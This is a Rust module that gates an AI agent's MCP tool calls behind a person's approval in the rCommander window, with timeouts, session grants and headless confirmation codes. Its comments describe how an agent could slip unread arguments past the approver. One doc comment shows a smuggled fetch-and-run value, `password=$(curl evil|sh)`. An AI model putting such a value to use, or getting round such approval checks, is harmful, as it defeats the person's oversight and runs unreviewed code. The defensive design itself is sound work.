//! Who answers when the policy says `ask` (RC-010-13): the person in the window, or nobody.
//!
//! While the rCommander window is open, the question goes there ([`Engine::ask_mcp`]): the call
//! waits up to [`ANSWER_WITHIN`] for the person and runs only on "allow"; "deny" ends it with
//! `denied_by_user`, silence with `timed_out`. A confirmation code counts for nothing then - it
//! would be the agent answering its own question. The question shows the call's arguments
//! through the same mask as every answer, clipped, with control and direction characters
//! spelled out, so a file name cannot dress up as something else. "Allow for this session" is
//! offered for write tools, per MCP session and tool, and for the executing tools that name
//! their target - the terminal `terminal_send_input` types into, the connection `ssh_exec` runs
//! on - per session, tool and target, for the minutes of
//! [`rc_engine::settings::MCP_EXEC_SESSION_MINUTES_KEY`] (RC-010-27). The engine keeps the
//! grants (`Engine::mcp_grants`), so the window shows them and takes them back.
//!
//! Without a window (`rcommander mcp` serving headless) nobody can be asked: the call is refused
//! with `headless_ask_denied`, unless a person switched on
//! [`rc_engine::settings::MCP_HEADLESS_CODE_KEY`] in the window's settings - then the
//! single-use confirmation code of `confirm.rs` stands in. The gate reads both settings with
//! the policy, in one query ([`GateSettings`]).
//!
//! What the person reads is what runs (RC-080-34): an executing or destructive call an argument
//! of which the mask would change is refused before anyone is asked ([`refuse_masked`]), a value
//! is measured as the call carries it, not as it is shown, and a call that reads a panel's
//! selection, cursor or folder runs with what the question showed of it (`freeze.rs`).
//!
//! The freeze holds on the two ways without a question in the window, too (RC-080-55): a call
//! allowed for the session runs frozen to the panels as they stand when it comes, pinned; and a
//! headless code is issued for the frozen call - its answer names the arguments written out,
//! masked and clipped as the window shows them - and redeeming it runs exactly that call, pinned,
//! whatever the panel shows by then. A panel moved elsewhere meanwhile refuses with
//! `panel_changed`.

use std::time::Duration;

use rc_engine::{
    CommandClass, Engine, MAX_SHOWN_CHARS, McpArgument, McpAsk, McpSessionOffer, McpVerdict,
    PanelId, mcp_readable as readable,
};
use rmcp::model::CallToolResult;
use serde_json::{Map, Value};

use crate::{
    answer::{error_result, json_result},
    confirm::{question, subject_of},
    freeze::{Frozen, as_frozen, freeze, shown_without_a_window},
    gate_settings::GateSettings,
    mask,
    server::McpContext,
};

/// How long a call waits for the person.
pub(crate) const ANSWER_WITHIN: Duration = Duration::from_secs(120);

/// How many arguments a question shows, and how many characters of each (`readable`).
const MAX_ARGUMENTS: usize = 32;
pub(crate) const MAX_VALUE_CHARS: usize = MAX_SHOWN_CHARS;

/// What the gate does with a call its policy asks about.
#[derive(Debug)]
pub(crate) enum Gate {
    /// Run it: with the arguments and the pinned panels the question showed, where it froze
    /// them (`freeze.rs`), else as called.
    Run(Option<Frozen>),
    /// End it with this answer.
    Answer(CallToolResult),
}

/// The gate's step for a call its policy asks about.
pub(crate) async fn ask(
    context: &McpContext,
    settings: &GateSettings,
    session: &str,
    tool: &str,
    class: CommandClass,
    arguments: Option<&Map<String, Value>>,
) -> Result<Gate, rmcp::ErrorData> {
    let engine = &context.engine;
    if let Some(refusal) =
        too_many_to_show(tool, arguments).or_else(|| refuse_masked(tool, class, arguments, engine))
    {
        return Ok(Gate::Answer(refusal));
    }
    let offer = session_offer(settings, class, tool, arguments);
    if let Some((_, target)) = &offer
        && engine.mcp_allowed_for_session(session, tool, target.as_deref())
    {
        // No question, but the call runs as the panels stand now, pinned (RC-080-55).
        return Ok(match freeze(engine, tool, arguments) {
            Ok(frozen) => Gate::Run(frozen),
            Err(refusal) => Gate::Answer(refusal),
        });
    }
    // A call allowed for the session shows no question; any other one must fit into it.
    if let Some(refusal) = too_long_to_show(tool, arguments) {
        return Ok(Gate::Answer(refusal));
    }
    if engine.has_window() {
        let frozen = match frozen_to_show(engine, tool, class, arguments) {
            Ok(frozen) => frozen,
            Err(refusal) => return Ok(Gate::Answer(refusal)),
        };
        let asked = frozen
            .as_ref()
            .map_or(arguments, |frozen| Some(&frozen.shown));
        let ask = McpAsk {
            tool: tool.to_owned(),
            class,
            arguments: shown(asked, engine),
            panel: asked
                .and_then(|arguments| arguments.get("panel"))
                .and_then(|panel| serde_json::from_value::<PanelId>(panel.clone()).ok()),
            cursor: takes_the_cursor(tool, arguments),
            session: offer.as_ref().map(|(session, _)| *session),
        };
        let verdict = match &frozen {
            Some(frozen) => {
                let panel = frozen.context.clone();
                engine
                    .ask_mcp_about(ask, panel, context.answer_within)
                    .await
            }
            None => engine.ask_mcp(ask, context.answer_within).await,
        };
        let refused = match verdict {
            McpVerdict::Allowed => return Ok(Gate::Run(frozen)),
            McpVerdict::AllowedForSession => {
                if let Some((offered, target)) = offer {
                    allow_for_session(engine, session, tool, offered, target);
                }
                return Ok(Gate::Run(frozen));
            }
            McpVerdict::Denied => error_result(
                "denied_by_user",
                &format!(
                    "the person declined {tool} in the rCommander window; nothing was done. Do \
                     not call it again unless they ask for it"
                ),
            ),
            McpVerdict::TimedOut => error_result(
                "timed_out",
                &format!(
                    "nobody answered the question about {tool} in the rCommander window within \
                     {} seconds; nothing was done",
                    context.answer_within.as_secs()
                ),
            ),
            McpVerdict::Busy => error_result(
                "too_many_questions",
                "too many calls wait for the person in the rCommander window; nothing was done",
            ),
            // The window went away in between: as headless.
            McpVerdict::NoWindow => {
                return headless(context, settings, session, tool, class, arguments).await;
            }
        };
        return Ok(Gate::Answer(refused));
    }
    headless(context, settings, session, tool, class, arguments).await
}

/// The call frozen to what a question shows of it (`freeze.rs`), and what the freeze wrote out
/// held to the limits of the question as the call was; `Ok(None)` for a tool that reads no panel.
fn frozen_to_show(
    engine: &Engine,
    tool: &str,
    class: CommandClass,
    arguments: Option<&Map<String, Value>>,
) -> Result<Option<Frozen>, CallToolResult> {
    let frozen = freeze(engine, tool, arguments)?;
    if let Some(frozen) = &frozen {
        let asked = Some(&frozen.shown);
        if let Some(refusal) = too_many_to_show(tool, asked)
            .or_else(|| refuse_masked(tool, class, asked, engine))
            .or_else(|| too_long_to_show(tool, asked))
        {
            return Err(refusal);
        }
    }
    Ok(frozen)
}

/// What "allow for this session" would grant this call, and the target it is bound to: a
/// write tool the whole session, an executing tool that names its target ([`exec_target`])
/// that target for the setting's minutes ([`GateSettings::exec_minutes`]); a destructive tool,
/// an executing one without a target or with 0 minutes nothing.
fn session_offer(
    settings: &GateSettings,
    class: CommandClass,
    tool: &str,
    arguments: Option<&Map<String, Value>>,
) -> Option<(McpSessionOffer, Option<String>)> {
    match class {
        CommandClass::Write => Some((McpSessionOffer::Session, None)),
        CommandClass::Exec => {
            let target = exec_target(tool, arguments)?;
            let minutes = settings.exec_minutes;
            (minutes > 0).then_some((McpSessionOffer::Minutes(minutes), Some(target)))
        }
        CommandClass::Read | CommandClass::Destructive | CommandClass::GuiOnly => None,
    }
}

/// The target an executing tool's grant is bound to: the terminal `terminal_send_input` types
/// into, the connection `ssh_exec` runs on, as `name=value`. Every other executing tool starts
/// something new with each call and is asked each time.
fn exec_target(tool: &str, arguments: Option<&Map<String, Value>>) -> Option<String> {
    let name = match tool {
        "terminal_send_input" => "terminal",
        "ssh_exec" => "connection_id",
        _ => return None,
    };
    let value = arguments?.get(name)?;
    (value.is_u64() || value.is_i64()).then(|| format!("{name}={value}"))
}

/// Remembers the person's "allow for this session"; one with minutes is dropped when they are
/// up, so the window's status bar stops showing it.
fn allow_for_session(
    engine: &Engine,
    session: &str,
    tool: &str,
    offered: McpSessionOffer,
    target: Option<String>,
) {
    let within = match offered {
        McpSessionOffer::Session => None,
        McpSessionOffer::Minutes(minutes) => Some(Duration::from_secs(u64::from(minutes) * 60)),
    };
    engine.allow_mcp_for_session(session, tool, target, within);
    if let Some(within) = within {
        let engine = engine.clone();
        tokio::spawn(async move {
            tokio::time::sleep(within).await;
            engine.prune_mcp_grants();
        });
    }
}

/// No window to ask in: refused, or the confirmation code where a person allowed that.
async fn headless(
    context: &McpContext,
    settings: &GateSettings,
    session: &str,
    tool: &str,
    class: CommandClass,
    arguments: Option<&Map<String, Value>>,
) -> Result<Gate, rmcp::ErrorData> {
    if !settings.headless_codes {
        return Ok(Gate::Answer(error_result(
            "headless_ask_denied",
            &format!(
                "{tool} needs a person's answer, and no rCommander window is open to ask in; \
                 nothing was done. Ask the person to start rCommander, or to allow confirmation \
                 codes without a window under Settings > MCP"
            ),
        )));
    }
    let offered = arguments
        .and_then(|arguments| arguments.get("confirmation"))
        .and_then(Value::as_str);
    let confirmations = &context.confirmations;
    // A code runs the call it was issued for, frozen then, if this is the same call (RC-080-55).
    if let Some(code) = offered
        && let Some(frozen) = confirmations.redeem_for(session, tool, code, |held| match held {
            Some(held) => subject_of(Some(&as_frozen(arguments, held))),
            None => subject_of(arguments),
        })
    {
        return Ok(Gate::Run(frozen));
    }
    let engine = &context.engine;
    let frozen = match frozen_to_show(engine, tool, class, arguments) {
        Ok(frozen) => frozen,
        Err(refusal) => return Ok(Gate::Answer(refusal)),
    };
    let (subject, named) = match &frozen {
        Some(frozen) => (
            subject_of(Some(&frozen.arguments)),
            shown(Some(&shown_without_a_window(frozen)), engine),
        ),
        None => (subject_of(arguments), shown(arguments, engine)),
    };
    let code = confirmations.ask_for(session, tool, subject.as_deref(), frozen);
    Ok(Gate::Answer(json_result(&question(
        tool,
        &code,
        class.as_str(),
        &named,
    ))?))
}

/// The refusal of a call with more arguments than a question shows (RC-080-03): the window
/// lists [`MAX_ARGUMENTS`], so filler arguments could push the one that matters out of sight,
/// and an argument the person never saw would still reach the tool. `None` for any other call.
fn too_many_to_show(tool: &str, arguments: Option<&Map<String, Value>>) -> Option<CallToolResult> {
    let count = arguments.map_or(0, |arguments| {
        arguments
            .keys()
            .filter(|name| name.as_str() != "confirmation")
            .count()
    });
    (count > MAX_ARGUMENTS).then(|| {
        error_result(
            "invalid_params",
            &format!(
                "{tool} was called with {count} arguments, and a question shows at most \
                 {MAX_ARGUMENTS}; nothing was done. Call it with the arguments it takes only"
            ),
        )
    })
}

/// Whether the call opens the entry under the cursor whatever is selected: `file_open` without
/// a `path` (RC-080-12), so the question names that entry rather than the selection.
fn takes_the_cursor(tool: &str, arguments: Option<&Map<String, Value>>) -> bool {
    tool == "file_open"
        && arguments
            .and_then(|arguments| arguments.get("path"))
            .is_none_or(Value::is_null)
}

/// The refusal of a call with a value longer than a question shows in full (RC-080-12): text
/// typed into a terminal, a login script's steps, a list of sources. The question clips at
/// [`MAX_VALUE_CHARS`], and what the person cannot read must not run. Measured as the call
/// carries the value, not as the mask shortens it (RC-080-34). `None` for any other call.
fn too_long_to_show(tool: &str, arguments: Option<&Map<String, Value>>) -> Option<CallToolResult> {
    let too_long = |text: &str| text.chars().count() > MAX_VALUE_CHARS;
    let (name, _) = as_text(arguments, None)
        .into_iter()
        .find(|(name, value)| too_long(name) || too_long(value))?;
    Some(error_result(
        "invalid_params",
        &format!(
            "the argument {} of {tool} is longer than the {MAX_VALUE_CHARS} characters a question \
             shows; nothing was done. Split the call into smaller ones",
            readable(&name.chars().take(64).collect::<String>())
        ),
    ))
}

/// The arguments as the person reads them: masked like an answer, the code left out, clipped.
fn shown(arguments: Option<&Map<String, Value>>, engine: &Engine) -> Vec<McpArgument> {
    masked(arguments, engine)
        .into_iter()
        .take(MAX_ARGUMENTS)
        .map(|(name, value)| McpArgument {
            name: readable(&name),
            value: readable(&value),
        })
        .collect()
}

/// The refusal of an executing or destructive call an argument of which the mask changes
/// (RC-080-34): the question would show `password=[redacted]` where the call types
/// `password=$(curl evil|sh)`, and the person would allow what they cannot read. Secrets come
/// from the vault, never from a call. `None` for any other call; a write call is shown masked,
/// as before.
fn refuse_masked(
    tool: &str,
    class: CommandClass,
    arguments: Option<&Map<String, Value>>,
    engine: &Engine,
) -> Option<CallToolResult> {
    if !matches!(class, CommandClass::Exec | CommandClass::Destructive) {
        return None;
    }
    let masked = masked(arguments, engine);
    let (name, _) = as_text(arguments, None)
        .into_iter()
        .find(|argument| !masked.contains(argument))?;
    Some(error_result(
        "invalid_params",
        &format!(
            "the argument {} of {tool} looks like a secret, and a question would show it masked; \
             nothing was asked and nothing was done. Secrets come from the vault, not from the \
             call",
            readable(&name.chars().take(64).collect::<String>())
        ),
    ))
}

/// Every argument but the code as text, masked like an answer, not yet clipped; a value that
/// is no string is its JSON.
fn masked(arguments: Option<&Map<String, Value>>, engine: &Engine) -> Vec<(String, String)> {
    as_text(arguments, Some(engine))
}

/// Every argument but the code as text, not yet clipped, masked when an `engine` is given; a
/// value that is no string is its JSON.
fn as_text(
    arguments: Option<&Map<String, Value>>,
    engine: Option<&Engine>,
) -> Vec<(String, String)> {
    let Some(arguments) = arguments else {
        return Vec::new();
    };
    let mut value = Value::Object(arguments.clone());
    if let Some(map) = value.as_object_mut() {
        map.remove("confirmation");
    }
    if let Some(engine) = engine {
        mask::mask_value_with(&mut value, &|text: &str| engine.scrub_secrets(text));
    }
    let Value::Object(map) = value else {
        return Vec::new();
    };
    map.into_iter()
        .map(|(name, value)| {
            let value = match value {
                Value::String(text) => text,
                other => other.to_string(),
            };
            (name, value)
        })
        .collect()
}

/// Lets the tests of other modules keep the confirmation-code path: what a person switches on
/// in the window's settings.
#[cfg(test)]
pub(crate) async fn allow_headless_codes(db: &rc_db::Db) {
    db.set(rc_engine::settings::MCP_HEADLESS_CODE_KEY, &true)
        .await
        .expect("stores the setting");
}

#[cfg(test)]
#[path = "ask_tests.rs"]
mod tests;

#[cfg(test)]
#[path = "ask_shown_tests.rs"]
mod shown_tests;

#[cfg(test)]
#[path = "ask_offer_tests.rs"]
mod offer_tests;
